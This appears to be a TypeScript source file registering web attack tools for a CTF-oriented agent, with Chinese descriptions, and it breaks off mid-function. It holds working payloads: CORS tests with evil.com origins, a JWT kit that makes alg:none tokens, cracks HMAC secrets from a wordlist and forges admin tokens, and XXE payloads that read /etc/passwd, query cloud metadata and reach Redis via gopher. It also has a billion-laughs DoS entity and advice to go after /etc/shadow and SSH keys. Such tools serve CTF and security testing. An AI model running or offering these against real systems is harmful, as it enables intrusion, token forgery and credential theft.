import { z } from "zod";
import * as http from "http";
import * as https from "https";
import * as child_process from "child_process";
import { ToolRegistry } from "./registry";

async function makeRequest(
  url: string,
  method: string = "GET",
  headers: Record<string, string> = {},
  body?: string,
  timeout: number = 10000
): Promise<{ statusCode: number; headers: Record<string, string>; body: string; error?: string }> {
  return new Promise((resolve) => {
    try {
      const parsedUrl = new URL(url);
      const isHttps = parsedUrl.protocol === "https:";
      const client = isHttps ? https : http;

      const options: any = {
        hostname: parsedUrl.hostname,
        port: parsedUrl.port || (isHttps ? 443 : 80),
        path: parsedUrl.pathname + parsedUrl.search,
        method: method.toUpperCase(),
        headers: { "User-Agent": "Flagent-CTF-Scanner/2.0", ...headers },
        timeout,
      };

      const req = client.request(options, (res) => {
        let data = "";
        res.on("data", (chunk) => (data += chunk));
        res.on("end", () => {
          const hdrs: Record<string, string> = {};
          for (const [k, v] of Object.entries(res.headers)) {
            hdrs[k] = Array.isArray(v) ? v.join(", ") : String(v);
          }
          resolve({ statusCode: res.statusCode || 0, headers: hdrs, body: data });
        });
      });

      req.on("error", (err) => resolve({ statusCode: 0, headers: {}, body: "", error: err.message }));
      req.on("timeout", () => { req.destroy(); resolve({ statusCode: 0, headers: {}, body: "", error: "timeout" }); });
      if (body) req.write(body);
      req.end();
    } catch (e: any) {
      resolve({ statusCode: 0, headers: {}, body: "", error: e.message });
    }
  });
}

const HTML_ENTITIES: Record<string, string> = {
  "&amp;": "&",
  "&lt;": "<",
  "&gt;": ">",
  "&quot;": '"',
  "&#39;": "'",
  "&apos;": "'",
  "&nbsp;": " ",
  "&copy;": "©",
  "&reg;": "®",
  "&trade;": "™",
};

function decodeHtmlEntities(text: string): string {
  return text
    .replace(/&#(\d+);/g, (_m, code: string) => String.fromCharCode(parseInt(code, 10)))
    .replace(/&#x([0-9a-fA-F]+);/g, (_m, code: string) => String.fromCharCode(parseInt(code, 16)))
    .replace(/&[a-zA-Z]+;/g, (m) => HTML_ENTITIES[m] || m);
}

function base64UrlDecode(str: string): string {
  const padded = str.replace(/-/g, "+").replace(/_/g, "/");
  const pad = padded.length % 4;
  const paddedStr = pad ? padded + "=".repeat(4 - pad) : padded;
  return Buffer.from(paddedStr, "base64").toString("utf8");
}

function base64UrlEncode(str: string): string {
  return Buffer.from(str, "utf8").toString("base64").replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
}

const COMMON_JWT_SECRETS = [
  "secret", "secret123", "123456", "password", "admin", "root",
  "your-256-bit-secret", "your-secret", "jwt-secret", "jwt_secret",
  "jwtsecret", "super-secret", "topsecret", "defaultsecret",
  "mysecret", "privatekey", "changeme", "qwerty", "letmein",
  "welcome", "abc123", "1q2w3e4r", "test", "demo", "guest",
  "dev", "dev-secret", "dev_secret", "production", "prod_secret",
  "springboot", "spring-boot", "SpringSecurity", "MyJwtSecret",
];

export function createWebAdvancedTools(): ToolRegistry {
  const registry = new ToolRegistry();

  registry.register({
    name: "waf_cdn_detect",
    description: "WAF/CDN 指纹识别：通过响应头、Cookie、HTML 关键词检测云 WAF/CDN 厂商",
    parameters: z.object({
      url: z.string().describe("目标 URL"),
    }),
    category: "web",
    concurrent: true,
    execute: async (args: any) => {
      const { url } = args;
      const res = await makeRequest(url, "GET", {});
      if (res.error) return `[WAF检测错误] ${res.error}`;

      const hdrs = res.headers;
      const cookies = hdrs["set-cookie"] || "";
      const body = res.body;

      const findings: Array<{ vendor: string; evidence: string; confidence: number }> = [];

      const headerChecks: Array<{ vendor: string; header: string; pattern: RegExp }> = [
        { vendor: "Cloudflare", header: "server", pattern: /cloudflare/i },
        { vendor: "Cloudflare", header: "cf-ray", pattern: /.+/ },
        { vendor: "Cloudflare", header: "cf-request-id", pattern: /.+/ },
        { vendor: "Akamai", header: "server", pattern: /Akamai/i },
        { vendor: "Akamai", header: "x-cache", pattern: /Akamai/i },
        { vendor: "Akamai", header: "akamai-ghost", pattern: /.+/ },
        { vendor: "AWS CloudFront", header: "x-cache", pattern: /cloudfront/i },
        { vendor: "AWS CloudFront", header: "x-amz-cf-id", pattern: /.+/ },
        { vendor: "阿里云 WAF/CDN", header: "server", pattern: /Aliyun|Tengine|TSW/i },
        { vendor: "阿里云 WAF", header: "x-cache", pattern: /aliyun/i },
        { vendor: "腾讯云 CDN/WAF", header: "server", pattern: /Qnginx|Squid\/3\.STABLE23/i },
        { vendor: "百度云加速", header: "server", pattern: /yunjiasu|BWS/i },
        { vendor: "安全狗", header: "server", pattern: /Safedog|404-safedog/i },
        { vendor: "宝塔 WAF", header: "server", pattern: /BT-Panel/i },
        { vendor: "长亭雷池", header: "server", pattern: /SafeLine/i },
        { vendor: "深信服 WAF", header: "server", pattern: /Sangfor/i },
        { vendor: "Imperva Incapsula", header: "x-cdn", pattern: /Incapsula/i },
        { vendor: "Azure CDN", header: "x-azure-ref", pattern: /.+/ },
        { vendor: "Fastly", header: "x-served-by", pattern: /fastly/i },
        { vendor: "CDN77", header: "cdn-cache-control", pattern: /.+/ },
        { vendor: "华为云 CDN", header: "x-dc", pattern: /.+/ },
      ];

      for (const check of headerChecks) {
        const val = hdrs[check.header.toLowerCase()];
        if (val && check.pattern.test(val)) {
          findings.push({ vendor: check.vendor, evidence: `响应头 ${check.header}: ${val}`, confidence: 0.9 });
        }
      }

      const cookieChecks: Array<{ vendor: string; pattern: RegExp }> = [
        { vendor: "Cloudflare", pattern: /__cfduid|__cf_bm|cf_clearance/ },
        { vendor: "阿里云 WAF", pattern: /aliyungf_tc/ },
        { vendor: "Imperva Incapsula", pattern: /AL_SESS|incap_ses|visid_incap/ },
        { vendor: "Azure App Service", pattern: /ARRAffinity/ },
        { vendor: "Laravel/Session", pattern: /laravel_session/ },
        { vendor: "宝塔 WAF", pattern: /bt_panel_security/ },
      ];

      for (const check of cookieChecks) {
        if (check.pattern.test(cookies)) {
          findings.push({ vendor: check.vendor, evidence: `Cookie 匹配: ${check.pattern.source}`, confidence: 0.85 });
        }
      }

      const htmlChecks: Array<{ vendor: string; pattern: RegExp }> = [
        { vendor: "Cloudflare", pattern: /Cloudflare|Attention Required|cf-error-code|__cf_chl_|_cf_chl_opt/ },
        { vendor: "安全狗", pattern: /safedog|安全狗|safedog\.cn/i },
        { vendor: "Mod_Security", pattern: /Mod_Security|mod_security|NOYB/i },
        { vendor: "Akamai", pattern: /AkamaiGhost/i },
        { vendor: "长亭雷池", pattern: /SafeLine|chaitin|雷池/i },
        { vendor: "宝塔面板", pattern: /BT-Panel|宝塔|bt\.cn/i },
        { vendor: "百度云加速", pattern: /BaiduYunjiasu|百度云加速|yunjiasu\.baidu/i },
        { vendor: "深信服", pattern: /Sangfor|深信服/i },
      ];

      for (const check of htmlChecks) {
        if (check.pattern.test(body)) {
          findings.push({ vendor: check.vendor, evidence: `HTML 关键词匹配: ${check.pattern.source}`, confidence: 0.75 });
        }
      }

      if (res.statusCode === 403 || res.statusCode === 503) {
        findings.push({ vendor: "未知 WAF", evidence: `状态码 ${res.statusCode}（可能被 WAF 拦截）`, confidence: 0.3 });
      }

      const vendorScores: Record<string, { score: number; evidence: string[] }> = {};
      for (const f of findings) {
        if (!vendorScores[f.vendor]) vendorScores[f.vendor] = { score: 0, evidence: [] };
        vendorScores[f.vendor].score += f.confidence;
        vendorScores[f.vendor].evidence.push(f.evidence);
      }

      const sorted = Object.entries(vendorScores).sort((a, b) => b[1].score - a[1].score);

      let result = `[WAF/CDN 检测] ${url}\n状态码: ${res.statusCode}\n\n`;
      if (sorted.length === 0) {
        result += "✅ 未检测到明显 WAF/CDN 指纹（可能为裸源服务器）\n";
      } else {
        result += "检测结果（按置信度排序）:\n";
        for (const [vendor, data] of sorted) {
          const confidence = Math.min(data.score / 0.9, 1.0);
          const bar = "█".repeat(Math.round(confidence * 10)) + "░".repeat(10 - Math.round(confidence * 10));
          result += `\n  🎯 ${vendor} [${bar}] ${(confidence * 100).toFixed(0)}%\n`;
          result += data.evidence.map((e) => `     • ${e}`).join("\n") + "\n";
        }
      }

      const headerKeys = Object.keys(hdrs).filter((k) =>
        /server|x-powered|x-cache|cf-|akamai|cdn|azure|fastly|x-amz|x-dc/i.test(k)
      );
      if (headerKeys.length > 0) {
        result += "\n相关响应头:\n";
        for (const k of headerKeys) result += `  ${k}: ${hdrs[k]}\n`;
      }

      return result;
    },
  });

  registry.register({
    name: "cors_audit",
    description: "CORS 配置安全审计：测试 Origin 反射、凭据泄露等常见 CORS 配置漏洞",
    parameters: z.object({
      url: z.string().describe("目标 URL"),
      mode: z.enum(["origin_null", "origin_subdomain", "origin_arbitrary", "all"]).default("all").describe("测试模式"),
      headers: z.record(z.string(), z.string()).optional().describe("额外请求头"),
    }),
    category: "web",
    concurrent: true,
    execute: async (args: any) => {
      const { url, mode = "all", headers = {} } = args;
      const parsed = new URL(url);
      const tld = parsed.hostname.split(".").slice(-2).join(".");
      const domain = parsed.hostname;

      const tests: Array<{ name: string; origin: string; mode: string; risk: string }> = [];

      if (mode === "all" || mode === "origin_null") {
        tests.push({ name: "Null Origin", origin: "null", mode: "origin_null", risk: "低（受浏览器限制）" });
      }
      if (mode === "all" || mode === "origin_subdomain") {
        tests.push({ name: "子域名前缀", origin: `https://evil.${domain}`, mode: "origin_subdomain", risk: "高（子域名接管）" });
        tests.push({ name: "同 TLD 域名", origin: `https://evil${tld}`, mode: "origin_subdomain", risk: "中" });
      }
      if (mode === "all" || mode === "origin_arbitrary") {
        tests.push({ name: "任意域名反射", origin: "https://evil.com", mode: "origin_arbitrary", risk: "严重！" });
        tests.push({ name: "信任域前缀绕过", origin: `https://evil.com?${domain}`, mode: "origin_arbitrary", risk: "高" });
        tests.push({ name: "信任域后缀绕过", origin: `https://${domain}.evil.com`, mode: "origin_arbitrary", risk: "高" });
        tests.push({ name: "特殊字符绕过", origin: `https://evil${domain}`, mode: "origin_arbitrary", risk: "高" });
      }

      const results: string[] = [];
      const risks: string[] = [];

      for (const t of tests) {
        const res = await makeRequest(url, "GET", { ...headers, Origin: t.origin });
        if (res.error) { results.push(`  [${t.name}] 请求失败: ${res.error}`); continue; }

        const acao = res.headers["access-control-allow-origin"];
        const acac = res.headers["access-control-allow-credentials"];
        const vary = res.headers["vary"] || "";

        let verdict = "✓ 安全";
        let details = "";

        if (acao === "*") {
          if (acac === "true") {
            verdict = "⚠️ 严重漏洞";
            details = "ACAO=* 且 ACAC=true 同时配置无效，但应用逻辑可能绕过检查";
            risks.push(`[${t.name}] 通配符+凭据配置异常`);
          } else {
            verdict = "ℹ️ 公共接口（通配符）";
            details = "ACAO=*";
          }
        } else if (acao === t.origin || acao === t.origin.replace(/^https?:\/\//, "")) {
          verdict = "⚠️ 高危 - Origin 反射";
          details = `ACAO=${acao}`;
          if (acac === "true") {
            verdict = "🚨 严重 - Origin反射+凭据允许";
            details += " ACAC=true，可窃取认证凭据";
          }
          risks.push(`[${t.name}] ${verdict} ${details}`);
        } else if (acao === "null") {
          verdict = "⚠️ Null Origin 被允许";
          details = "ACAO=null，可通过 iframe sandbox 绕过";
          if (acac === "true") {
            verdict = "🚨 严重 - Null+凭据允许";
            risks.push(`[${t.name}] ${verdict}`);
          }
        }

        results.push(`  [${t.name}] 模式=${t.mode} Origin=${t.origin} → ${verdict}${details ? ` (${details})` : ""} 风险:${t.risk}`);
        if (acao) results.push(`     ACAO=${acao} ACAC=${acac || "N/A"} Vary=${vary || "N/A"}`);
      }

      let out = `[CORS 审计] ${url}\n\n测试结果:\n${results.join("\n")}\n`;
      if (risks.length > 0) {
        out += `\n🚨 发现 ${risks.length} 个风险点:\n${risks.map((r) => `  • ${r}`).join("\n")}\n`;
        out += "\n建议修复:\n" +
          "  1. 使用白名单校验 Origin 域名（精确匹配，不要用后缀/前缀匹配）\n" +
          "  2. 动态返回 ACAO 而不是通配符 *\n" +
          "  3. 配合 Vary: Origin 防止缓存投毒\n" +
          "  4. 仅在必要时启用 Access-Control-Allow-Credentials\n";
      } else {
        out += "\n✅ 未发现明显 CORS 配置漏洞\n";
      }

      return out;
    },
  });

  registry.register({
    name: "jwt_attack",
    description: "JWT 攻击工具箱：解码、alg:none、RS256→HS256 切换、HMAC 密钥爆破",
    parameters: z.object({
      token: z.string().describe("JWT Token (xxx.yyy.zzz)"),
      mode: z.enum(["decode", "alg_none", "rs256_hs256", "key_crack", "all"]).default("decode").describe("攻击模式"),
      payload: z.string().optional().describe("自定义 payload JSON（替换 claims）"),
      key_list: z.string().optional().describe("密钥字典文件路径"),
      key: z.string().optional().describe("指定密钥签名（HS256）"),
    }),
    category: "web",
    concurrent: true,
    execute: async (args: any) => {
      const { token, mode = "decode" } = args;
      const parts = token.split(".");
      if (parts.length !== 3) {
        return `[JWT 错误] 无效 JWT 格式，应为 header.payload.signature 三段式`;
      }

      let header: any = {};
      let payloadObj: any = {};
      let decodeError = "";

      try {
        header = JSON.parse(base64UrlDecode(parts[0]));
      } catch (e: any) {
        decodeError += `Header 解析失败: ${e.message}\n`;
      }
      try {
        payloadObj = JSON.parse(base64UrlDecode(parts[1]));
      } catch (e: any) {
        decodeError += `Payload 解析失败: ${e.message}\n`;
      }

      let output = `[JWT 解码分析]\n\n`;
      output += `原始 Token:\n  ${token.slice(0, 80)}...\n\n`;

      if (decodeError) {
        output += `⚠️ 解析警告:\n${decodeError}\n`;
      }

      output += `📋 Header (alg=${header.alg || "?"}, typ=${header.typ || "?"}):\n`;
      output += JSON.stringify(header, null, 2) + "\n\n";
      output += `📦 Payload:\n`;
      output += JSON.stringify(payloadObj, null, 2) + "\n\n";

      const exp = payloadObj.exp;
      const now = Math.floor(Date.now() / 1000);
      if (exp) {
        const remain = exp - now;
        if (remain < 0) output += `⚠️ Token 已过期 (${Math.abs(remain)}秒前)\n`;
        else output += `ℹ️ Token 有效期剩余 ${remain}秒 (${Math.floor(remain / 3600)}小时${Math.floor((remain % 3600) / 60)}分钟)\n`;
      }
      if (payloadObj.iat) output += `ℹ️ 签发时间: ${new Date(payloadObj.iat * 1000).toLocaleString()}\n`;
      if (payloadObj.nbf) output += `ℹ️ 生效时间: ${new Date(payloadObj.nbf * 1000).toLocaleString()}\n`;
      if (payloadObj.iss) output += `ℹ️ 签发者: ${payloadObj.iss}\n`;
      if (payloadObj.aud) output += `ℹ️ 受众: ${JSON.stringify(payloadObj.aud)}\n`;
      if (payloadObj.sub) output += `ℹ️ 主体: ${payloadObj.sub}\n`;

      const critHeaderFlags: string[] = [];
      if (header.alg === "none") critHeaderFlags.push("alg=none（空签名算法）");
      if (header.alg === "HS256" && header.jwk) critHeaderFlags.push("内嵌JWK（可能混淆密钥）");
      if (header.crit) critHeaderFlags.push(`crit=${JSON.stringify(header.crit)}（关键扩展）`);
      if (header.kid && /\.|\/|\\|etc|var|proc|file/i.test(header.kid)) critHeaderFlags.push(`kid 疑似路径注入: ${header.kid}`);
      if (critHeaderFlags.length > 0) {
        output += `\n🚨 Header 可疑点:\n${critHeaderFlags.map((f) => `  • ${f}`).join("\n")}\n`;
      }

      const crypto = require("crypto");

      const customPayload = args.payload ? JSON.parse(args.payload) : payloadObj;

      function buildToken(newHeader: any, newPayload: any, signFn?: (data: string) => string): string {
        const h = base64UrlEncode(JSON.stringify(newHeader));
        const p = base64UrlEncode(JSON.stringify(newPayload));
        const signingInput = `${h}.${p}`;
        const s = signFn ? base64UrlEncode(signFn(signingInput)) : "";
        return `${signingInput}.${s}`;
      }

      if (mode === "all" || mode === "alg_none") {
        output += `\n${"=".repeat(50)}\n🔓 alg:none 攻击测试（空签名算法）\n`;
        const noneVariants = ["none", "None", "nOnE", "NONE", "NoNe"];
        const generatedTokens: string[] = [];
        for (const alg of noneVariants) {
          const attackHeader = { ...header, alg };
          const tok = buildToken(attackHeader, customPayload);
          generatedTokens.push(`  alg="${alg}": ${tok.slice(0, 100)}...`);
        }
        output += `生成的 Token:\n${generatedTokens.join("\n")}\n`;
        output += `使用方式: 将 Token 放入 Authorization: Bearer <token> 发送请求，观察是否绕过认证\n`;
      }

      if (mode === "all" || mode === "rs256_hs256") {
        output += `\n${"=".repeat(50)}\n🔑 RS256→HS256 算法混淆攻击\n`;
        output += `原理: 如果后端用公钥验证签名，将 alg=RS256 改为 HS256，用公钥作为 HMAC 密钥签名\n`;
        const attackHeader = { ...header, alg: "HS256" };
        const placeholderKey = "REPLACE_WITH_RSA_PUBLIC_KEY_PEM";
        const sampleSig = crypto.createHmac("sha256", placeholderKey).update("test").digest("base64");
        output += `  修改后 Header alg: HS256\n`;
        output += `  需获取目标 RSA 公钥（通常在 jwks_uri 或证书中），以 PEM/DER 形式作为 HMAC 密钥\n`;
        output += `  示例签名（占位）: ${sampleSig.slice(0, 40)}...\n`;
        output += `  生成命令（需实际公钥）:\n`;
        output += `    node -e "const c=require('crypto');const k='<PEM_PUBLIC_KEY>';const h=Buffer.from(JSON.stringify({alg:'HS256',typ:'JWT'})).toString('base64url');const p=Buffer.from(JSON.stringify(${JSON.stringify(customPayload)})).toString('base64url');console.log(h+'.'+p+'.'+c.createHmac('sha256',k).update(h+'.'+p).digest('base64url'))"\n`;
      }

      if (mode === "all" || mode === "key_crack") {
        output += `\n${"=".repeat(50)}\n🔨 HMAC-SHA256 密钥爆破（内置字典）\n`;
        const signingInput = `${parts[0]}.${parts[1]}`;
        const targetSig = parts[2];

        let wordlist: string[] = [];
        if (args.key) {
          wordlist = [args.key];
          output += `使用指定密钥: ${args.key}\n`;
        } else if (args.key_list) {
          try {
            const fs = require("fs");
            const content = fs.readFileSync(args.key_list, "utf8");
            wordlist = content.split(/\r?\n/).filter((l: string) => l.trim());
            output += `加载字典文件: ${args.key_list} (${wordlist.length}条)\n`;
          } catch (e: any) {
            output += `⚠️ 字典文件加载失败: ${e.message}，使用内置字典\n`;
            wordlist = COMMON_JWT_SECRETS;
          }
        } else {
          wordlist = COMMON_JWT_SECRETS;
          output += `使用内置字典 (${COMMON_JWT_SECRETS.length} 条常见密钥)\n`;
        }

        let foundKey: string | null = null;
        let tried = 0;
        output += `开始爆破...\n`;
        for (const secret of wordlist) {
          tried++;
          try {
            const hmac = crypto.createHmac("sha256", secret).update(signingInput).digest();
            const b64u = Buffer.from(hmac).toString("base64").replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
            if (b64u === targetSig) {
              foundKey = secret;
              break;
            }
          } catch { /* 无效密钥 */ }
          if (tried % 10 === 0 && !foundKey) {
            // 避免输出过多
          }
        }

        if (foundKey) {
          output += `\n✅ 爆破成功！尝试了 ${tried} 个密钥\n`;
          output += `   找到密钥: "${foundKey}"\n`;
          output += `   现在可以用此密钥伪造任意 Payload 的 JWT！\n`;
          const fakeHeader = { alg: "HS256", typ: "JWT" };
          const fakePayload = { ...customPayload, admin: true, role: "admin" };
          const fakeSig = base64UrlEncode(
            crypto.createHmac("sha256", foundKey).update(
              base64UrlEncode(JSON.stringify(fakeHeader)) + "." + base64UrlEncode(JSON.stringify(fakePayload))
            ).digest()
          );
          const fakeToken = `${base64UrlEncode(JSON.stringify(fakeHeader))}.${base64UrlEncode(JSON.stringify(fakePayload))}.${fakeSig}`;
          output += `   伪造 admin Token:\n     ${fakeToken}\n`;
        } else {
          output += `\n❌ 爆破失败，尝试了 ${tried} 个密钥均未匹配\n`;
          output += `   建议: 使用更大的字典 (如 rockyou.txt)、配合 JWT cracker 工具、或改为其他攻击模式\n`;
        }
      }

      return output;
    },
  });

  registry.register({
    name: "csrf_audit",
    description: "CSRF 防御机制审计：测试缺少 Origin/Referer/CSRF Token 时的状态码差异",
    parameters: z.object({
      url: z.string().describe("目标 URL（POST 端点最佳）"),
      method: z.enum(["GET", "POST"]).default("POST").describe("HTTP 方法"),
      data: z.string().optional().describe("请求体数据（POST 时使用）"),
      headers: z.record(z.string(), z.string()).optional().describe("额外请求头（如 Cookie）"),
    }),
    category: "web",
    concurrent: true,
    execute: async (args: any) => {
      const { url, method = "POST", data, headers = {} } = args;
      const results: string[] = [];
      const risks: string[] = [];

      const normalHeaders = { ...headers, "Content-Type": "application/x-www-form-urlencoded" };
      results.push("📡 [正常请求] 发送包含默认头部的请求...");
      const normal = await makeRequest(url, method, normalHeaders, data);
      if (normal.error) { results.push(`  ❌ 请求失败: ${normal.error}`); return `[CSRF审计错误]\n${results.join("\n")}`; }
      results.push(`  状态码: ${normal.statusCode} | 响应大小: ${normal.body.length}B`);

      const attackScenarios = [
        { name: "缺失Origin+Referer", remove: ["origin", "referer"], add: {} },
        { name: "恶意Origin(evil.com)", remove: ["origin", "referer"], add: { Origin: "https://evil.com", Referer: "https://evil.com/attack" } },
        { name: "Null Origin", remove: ["origin", "referer"], add: { Origin: "null" } },
        { name: "同源但端口不同", remove: ["origin"], add: { Origin: new URL(url).origin.replace(/:\d+$/, ":9999") } },
        { name: "缺失CSRF Token头", remove: ["x-csrf-token", "csrf-token", "x-xsrf-token", "x-requested-with"], add: {} },
        { name: "伪造X-Requested-With", remove: [], add: { "X-Requested-With": "XMLHttpRequest" } },
      ];

      for (const scenario of attackScenarios) {
        const testHeaders: Record<string, string> = { ...headers, "Content-Type": "application/x-www-form-urlencoded" };
        for (const rh of scenario.remove) delete testHeaders[rh.toLowerCase()];
        Object.assign(testHeaders, scenario.add);

        const res = await makeRequest(url, method, testHeaders, data);
        if (res.error) { results.push(`  [${scenario.name}] 请求失败: ${res.error}`); continue; }

        const sameStatus = res.statusCode === normal.statusCode;
        const sameSize = Math.abs(res.body.length - normal.body.length) < Math.max(normal.body.length * 0.1, 100);
        const bodySimilar = sameSize || res.body.slice(0, 100) === normal.body.slice(0, 100);

        let verdict = "✅ 已防御";
        if (sameStatus && bodySimilar) {
          verdict = "⚠️ 可能存在CSRF漏洞！";
          risks.push(`${scenario.name} → 响应与正常请求几乎一致 (${res.statusCode}, ${res.body.length}B)`);
        } else if (sameStatus) {
          verdict = "⚠️ 状态码相同但响应体不同，需人工确认";
        } else if (res.statusCode >= 400 && res.statusCode < 500) {
          verdict = "✅ 防御有效（返回4xx）";
        }

        results.push(`\n  [${scenario.name}]`);
        results.push(`     状态码: ${res.statusCode} (正常${normal.statusCode}) | 大小: ${res.body.length}B (正常${normal.body.length}B) → ${verdict}`);
        if (Object.keys(scenario.add).length > 0) {
          results.push(`     注入头: ${JSON.stringify(scenario.add)}`);
        }
      }

      let out = `[CSRF 审计] ${url} [${method}]\n\n${results.join("\n")}\n\n`;
      if (risks.length > 0) {
        out += `🚨 发现 ${risks.length} 个潜在 CSRF 风险点:\n${risks.map((r, i) => `  ${i + 1}. ${r}`).join("\n")}\n\n`;
        out += "建议修复:\n" +
          "  1. 使用 CSRF Token（Double Submit Cookie 或 Synchronizer Token）\n" +
          "  2. 严格校验 Origin/Referer 白名单（不要后缀匹配）\n" +
          "  3. SameSite Cookie 属性（Lax/Strict）\n" +
          "  4. 自定义请求头如 X-Requested-With\n";
      } else {
        out += "✅ CSRF 防御机制看起来正常\n";
      }

      return out;
    },
  });

  registry.register({
    name: "xxe_test",
    description: "XXE (XML 外部实体注入) 测试：文件读取、SSRF、Blind XXE 探测",
    parameters: z.object({
      url: z.string().describe("目标 URL（接受 XML 的端点）"),
      parameter: z.string().optional().describe("XML 参数名（如 multipart 中字段名）"),
      mode: z.enum(["file_read", "ssrf", "doctype", "all"]).default("all").describe("测试模式"),
      read_path: z.string().default("/etc/passwd").describe("文件读取路径"),
    }),
    category: "web",
    concurrent: true,
    execute: async (args: any) => {
      const { url, parameter, mode = "all", read_path = "/etc/passwd" } = args;
      const results: string[] = [];
      const findings: string[] = [];

      const payloads: Array<{ name: string; xml: string; kind: string }> = [];

      if (mode === "all" || mode === "file_read") {
        payloads.push({
          name: "普通ENTITY读取文件",
          kind: "file_read",
          xml: `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file://${read_path}">]><root>&xxe;</root>`,
        });
        payloads.push({
          name: "PHP包装器 base64读",
          kind: "file_read",
          xml: `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=${read_path}">]><root>&xxe;</root>`,
        });
        payloads.push({
          name: "参数实体(Blind)",
          kind: "file_read",
          xml: `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % file SYSTEM "file://${read_path}"><!ENTITY % dtd SYSTEM "http://127.0.0.1:9000/evil.dtd">%dtd;%send;]><root/>`,
        });
      }

      if (mode === "all" || mode === "ssrf") {
        payloads.push({
          name: "HTTP SSRF 回环",
          kind: "ssrf",
          xml: `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://127.0.0.1/">]><root>&xxe;</root>`,
        });
        payloads.push({
          name: "SSRF 云元数据",
          kind: "ssrf",
          xml: `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>`,
        });
        payloads.push({
          name: "gopher 协议",
          kind: "ssrf",
          xml: `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "gopher://127.0.0.1:6379/_INFO%0d%0a">]><root>&xxe;</root>`,
        });
      }

      if (mode === "all" || mode === "doctype") {
        payloads.push({
          name: "DTD外部引用",
          kind: "doctype",
          xml: `<?xml version="1.0"?><!DOCTYPE foo SYSTEM "http://127.0.0.1:9000/test.dtd"><foo/>`,
        });
        payloads.push({
          name: "超大实体(DoS)",
          kind: "doctype",
          xml: `<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">]><lolz>&lol2;</lolz>`,
        });
      }

      results.push(`[XXE 测试] ${url}\n模式: ${mode} | 读取文件: ${read_path}\n共 ${payloads.length} 个 payload\n${"=".repeat(60)}\n`);

      for (const p of payloads) {
        results.push(`\n▶ [${p.name}] (${p.kind})`);
        try {
          const body = parameter ? `${parameter}=${encodeURIComponent(p.xml)}` : p.xml;
          const ctype = parameter ? "application/x-www-form-urlencoded" : "application/xml";
          const res = await makeRequest(url, "POST", { "Content-Type": ctype }, body, 15000);

          if (res.error) {
            results.push(`  请求错误: ${res.error}`);
            continue;
          }

          results.push(`  状态码: ${res.statusCode} | 响应大小: ${res.body.length}B`);

          const bodySnippet = res.body.slice(0, 500);
          const isFileRead = /root:.*:.*:\/|daemon:|nobody:|admin:|\.ssh|id_rsa|<?xml/i.test(bodySnippet) && p.kind === "file_read";
          const isSSRFResp = /127\.0\.0\.1|localhost|meta-data|ami-id|security-credentials/i.test(bodySnippet) && p.kind === "ssrf";
          const hasXMLError = /xml|parser|parse|entity|DOCTYPE|DOCTYPE|simplexml|libxml|fatal|error|warning/i.test(bodySnippet);
          const hasSensitive = /root:|Administrator|C:\\Users|C:\\Windows|\/etc\/hosts|database|password/i.test(bodySnippet);

          if (isFileRead || hasSensitive) {
            results.push(`  🚨 疑似存在 XXE 文件读取漏洞！`);
            findings.push(`${p.name} - 文件读取成功`);
          }
          if (isSSRFResp) {
            results.push(`  🚨 疑似存在 SSRF via XXE！`);
            findings.push(`${p.name} - SSRF 成功`);
          }
          if (hasXMLError) {
            results.push(`  ⚠️ XML 解析错误泄露，可能支持 XXE`);
            if (!findings.includes(p.name)) findings.push(`${p.name} - XML错误泄露`);
          }

          results.push(`  响应片段:\n    ${bodySnippet.replace(/\n/g, "\n    ")}${res.body.length > 500 ? "\n    ...(截断)" : ""}`);
        } catch (e: any) {
          results.push(`  异常: ${e.message}`);
        }
      }

      results.push(`\n${"=".repeat(60)}`);
      if (findings.length > 0) {
        results.push(`\n🚨 发现 ${findings.length} 个可疑点:\n${findings.map((f) => `  • ${f}`).join("\n")}`);
        results.push(`\n下一步:\n  - 尝试读取更多敏感文件: /etc/shadow, ~/.ssh/id_rsa, /proc/self/environ\n  - 使用 OOB (Out-of-Band) XXE: xxe.sh, burp collaborator\n  - SSRF: 内网扫描、云元数据服务\n`);
      } else {
        results.push(`\n✅ 未发现明显 XXE 漏洞`);
      }

      return results.join("\n");
    },
  });

  registry.register({
    name: "graphql_attack",
    description: "GraphQL 攻击：Introspection 内省、DoS 深递归嵌套、批量查询",
    parameters: z.object({
      url: z.string().describe("GraphQL 端点 URL"),
      mode: z.enum(["introspect", "ds", "batch_attack", "all"]).default("all").describe("攻击模式"),
      query: z.string().optional().describe("自定义 GraphQL 查询"),
      batch_count: z.number().min(5).max(100).default(10).describe("批量攻击请求数"),
    }),
    category: "web",
    concurrent: true,
    execute: async (args: any) => {
      const { url, mode = "all", batch_count = 10 } = args;
      const results: string[] = [];

      results.push(`[GraphQL 攻击测试] ${url}\n模式: ${mode}\n${"=".repeat(60)}`);

      async function gqlRequest(query: string, extraHeaders: Record<string, string> = {}) {
        const body = JSON.stringify({ query });
        return await makeRequest(url, "POST", {
          "Content-Type": "application/json",
          Accept: "application/json",
          ...extraHeaders,
        }, body);
      }

      if (mode === "all" || mode === "introspect") {
        results.push(`\n🔍 [模式1/3] Introspection 内省查询`);
        const introQuery = `{ __schema { types { name kind fields { name type { name kind ofType { name kind } } } } } }`;
        const fullIntroQuery = `query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } directives { name description locations args { ...InputValue } } } } fragment FullType on __Type { kind name description fields(includeDeprecated:true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated:true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name } } } }`;

        const resp = await gqlRequest(introQuery);
        results.push(`  状态码: ${resp.statusCode} | 大小: ${resp.body.length}B`);

        if (resp.error) {
